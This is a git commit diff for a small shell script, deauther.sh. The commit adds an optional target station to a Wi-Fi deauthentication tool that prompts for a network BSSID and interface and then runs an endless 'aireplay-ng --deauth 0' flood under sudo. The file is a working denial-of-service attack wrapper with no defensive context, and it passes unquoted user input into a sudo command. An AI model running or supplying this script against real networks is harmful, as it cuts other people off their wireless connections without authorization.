345e3a1b9e89971f4e5aabf3ed74e9627fa1bd6b
sixpennyfox4 <asenoprenov2022@gmail.com>
2024-06-13 23:21:22 +0300

    New1

--- deauther.sh
+++ deauther.sh
@@ -2,7 +2,13 @@
 
 printf "Whats the target bssid?: "
 read bssid
+printf "Do you want to deauth a specific device (leave black if no if yes then put the device station): "
+read station
 printf "Whats the interface?: "
 read interface
 
-sudo aireplay-ng --ignore-negative-one --deauth 0 -a $bssid $interface
+if [ "$station" == "" ]; then
+        sudo aireplay-ng --ignore-negative-one --deauth 0 -a $bssid $interface
+else
+        sudo aireplay-ng --ignore-negative-one --deauth 0 -a $bssid -c $station $interface
+fi
